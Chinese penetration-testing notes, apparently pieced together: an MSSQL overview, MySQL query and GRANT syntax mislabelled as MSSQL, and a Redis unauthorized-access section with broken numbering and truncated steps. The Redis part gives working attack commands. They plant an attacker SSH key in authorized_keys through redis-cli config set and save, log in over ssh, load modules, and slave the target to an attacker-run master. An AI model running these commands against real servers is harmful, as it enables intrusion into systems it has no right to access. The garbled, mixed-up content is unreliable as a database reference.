一、Mssql简介

1433端口，是SQL Server默认的端口，SQL Server服务使用两个端口：TCP-1433、UDP-1434。其中1433用于供SQL Server对外提供服务，1434用于向请求者返回SQL Server使用了哪个TCP/IP端口

三、mssql的四个数据库


【master】

master数据库是SQL Server中最重要的数据库，记录了SQL Server系统中所有的系统信息，包括登入账户、系统配置和设置、服务器中数据库的名称、相关信息和这些数据库文件的位置，以及SQL Server初始化信息等。

【model】

model系统数据库是一个模板数据库，可以用作建立数据库的摸板。它包含了建立新数据库时所需的基本对象，如系统表、查看表、登录信息等。在系统执行建立新数据库操作时，它会复制这个模板数据库的内容到新的数据库上。

【msdb】

msdb系统数据库是提供提“SQL Server代理服务”调度警报、作业以及记录操作员时使用。如果不使用这些SQL Server代理服务，就不会使用到该系统数据库。

【tempdb】

tempdb数据库是存在于SQL Server会话期间的一个临时性的数据库。一旦关闭SQL Server，tempdb数据库保存的内容将自动消失。重启动SQL Server时，系统将重新创建新的、空的tempdb数据库。

四、三个关键系统表

1、sysdatabases(存储数据库名)

保存了数据库相关的信息，最初安装SQL Server的时候，sysdatabases包含了master、model、msdb、mssqlweb和tempdb数据库的项，该表存储在master数据库中。他保存了，所有的库名,以及库的ID，和一些相关信息。

2、sysobjects(存储表名)

SQL-Server的每个数据库内都有此数据表，它存放该数据库内创建的所有对象。如约束，默认值，日志，规则，存储过程，每个对象在表中占一行。

3、syscolumns(存储列名)

每个表和视图中的每列在表中占一行，存储过程中的每个参数也占一行，该表位于每个数据库中

create table 表(字段名1 字段类型,字段名2 字段类型......);


删除：

drop table 表;


修改：

添加字段： alter table 表 add [column] 字段名 字段类型;

修改字段类型： alter table 表 modify 字段名 新的字段类型;
修改字段名称 ： alter table 表 change 旧字段名 新字段名 字段类型;
修改表名称：   alter table 表 rename [to] 新表名;


查询：

show tables  /  desc student;


3、管理数据
增加：

insert into 表(字段1，字段2,。。。) values(值1，值2.。。。。);


删除：

delete from 表 where 条件;


修改：

update 表 set 字段1=值1，字段2=值2...... where 条件;


查询：

1）所有字段： select * from 表;
2）指定字段： select 字段1,字段2.... from 表;
3)指定别名： select 字段1 as 别名 from 表;
4 )合并列： select (字段1+字段2) from 表;
5)去重： select distinct 字段 from 表;
6)条件查询：
	a)逻辑条件 ：and(与)     or（或）
	select * from 表 where 条件1 and/or 条件2
	b）比较条件： >  <  >=  <=  =  <>   between and(在。。。之间)
	select * from 表 where servlet>=90;
	c）判空条件： 
	 判断null： is null   /  is not null
	判断空字符串： =''    /  <>''
	d）模糊条件： like 
	  %:  替换任意个字符
	  _:   替换一个字符			
7 分页查询：limit 起始行,查询行数
	起始行从0开始
8 排序： order by 字段 asc/desc
	asc: 正序，顺序
	desc：反序，倒序
9 分组查询：group by 字段
10: 分组后筛选： having 条件

2、用户权限授予

1）查看用户权限

show  grants  for  ‘用户名’@’ IP ’;


2）给一个用户所有的权限，并允许用户将自己的权限给其他的新用户

grant  select(列，列)  on  数据库名.表  to  ‘ 用户名 ’@’ ip ’; 
select 可以换成其他的  select,delete  或
grant  select,delete(列，列)  on  数据库名.表  to  ‘ 用户名 ’@’ ip ’;


4）授予在数据库中所有权限

grant  all  on  数据库名.*  to  ‘用户名’@’ IP ’;


5）授予系统中已经存在用户有创建用户的权限

Grant  create  user  on  *.*  to  ‘用户名’@’ IP ’;


6）限制处理语句时间的权限(比如限制一小时只能处理一条语句)

Grant  delete  on  数据库名.表名   to  ‘用户名’@’ IP ’  with  max_queries_per_hour 1;


7）例如在什么库的什么表上的select权限

Revoke   select  on   库名.表名  from  ‘用户名’@’IP’;

4、SSH公钥登录

在 config get * 命令的输出中，可以找到 redis ⽤户的主⽬录(通常为 /var/lib/redis 或者 /home/redis/.ssh )。了解这⼀点，就知道在哪写⼊ authorized_keys 公钥认证授权⽂件。如果你对其他帐号主 ⽬录也拥有可写权限，也可以写⼊⾃⼰的公钥，实现公钥认证登录。

# 攻击者⽣成密钥⽂件对 
ssh-keygen -t rsa

# 将公钥写⼊⽂件 foo.txt
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt

# 将⽂件 foo.txt 导⼊ redis
cat foo.txt | redis-cli -h <IP> -x set ssh_key
cat foo.txt | redis-cli -h 10.0.2.42 -x set ssh_key

redis-cli -h 10.0.2.42
10.0.2.42:6379>
10.0.2.42:6379> config set dbfilename "authorized_keys"
10.0.2.42:6379> save

# 将公钥保存到redis服务器上的authorized_keys中
kali@kali:~$ redis-cli -h 10.0.2.42
<IP>:6379> config set dir /var/lib/redis/.ssh
# <IP>:6379> config set dir /var/lib/redis
<IP>:6379> config set dbfilename "authorized_keys"
<IP>:6379> save

# 最后使⽤公钥登录⽬标服务器
ssh -i id_rsa test@<IP>

# 使⽤公钥登录
ssh -i id_rsa redis@10.0.2.42

2. 需要⼀种⽅法上传模块； 
3. 加载模块 MODULE LOAD /path/to/mymodule.so 
4. 列出已加载的模块，验证模块是否正确加载 MODULE LIST

6、Master-Slave 模块
主redis的所有操作都⾃动同步到从redis，这意味着我们可以将漏洞redis视为⼀个从redis，连接到我们⾃⼰ 控制的主redis，然后我们可以向我们⾃⼰的redis输⼊命令。

# master redis : 10.0.2.15 (kali)
# slave redis : 10.0.2.42 (⽬标redis服务器)
redis-cli -h 10.0.2.42 -p 6379
slaveof 10.0.2.15 6379

# 然后登录Master，控制Slave:
redis-cli -h 10.0.2.1 -p 6379
set mykey hello
set mykey2 helloworld
